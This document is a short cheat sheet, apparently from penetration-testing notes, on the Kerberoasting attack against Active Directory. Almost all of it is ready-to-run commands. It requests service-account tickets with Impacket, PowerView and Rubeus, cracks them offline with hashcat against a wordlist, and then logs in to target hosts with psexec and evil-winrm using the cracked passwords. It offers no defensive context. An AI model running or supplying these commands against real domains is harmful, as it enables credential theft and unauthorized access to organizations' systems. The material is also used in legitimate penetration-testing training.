# Kerberoasting (GetUserSPNs)

Request TGS tickets for service accounts (SPNs) and crack them offline — no special privileges needed, just a domain user.

**Enumerate and request tickets:**
```bash
# Impacket (from Linux):
GetUserSPNs.py -request -dc-ip <DC_IP> <domain>/<user>:<pass> -outputfile spns.out

# PowerView (from Windows):
Get-DomainUser -SPN | Select SamAccountName, ServicePrincipalName
Invoke-Kerberoast -OutputFormat Hashcat | Select-Object Hash | Out-File spns.txt

# Rubeus (from Windows):
Rubeus.exe kerberoast /outfile:spns.txt /format:hashcat
```

**Crack tickets (hashcat mode 13100 = KRB5TGS-23):**
```bash
hashcat -m 13100 spns.out /usr/share/wordlists/rockyou.txt
```

**Filter high-value accounts (often misconfigured):**
```bash
GetUserSPNs.py -request -dc-ip <DC_IP> <domain>/<user>:<pass> -request-user <svcaccount>
```

**If cracked, authenticate:**
```bash
psexec.py <domain>/<svcaccount>:<password>@<TARGET>
evil-winrm -i <TARGET> -u <svcaccount> -p <password>
```

Tickets with RC4 (type 23) crack faster than AES (type 17/18). Look for `$krb5tgs$23$` in output.
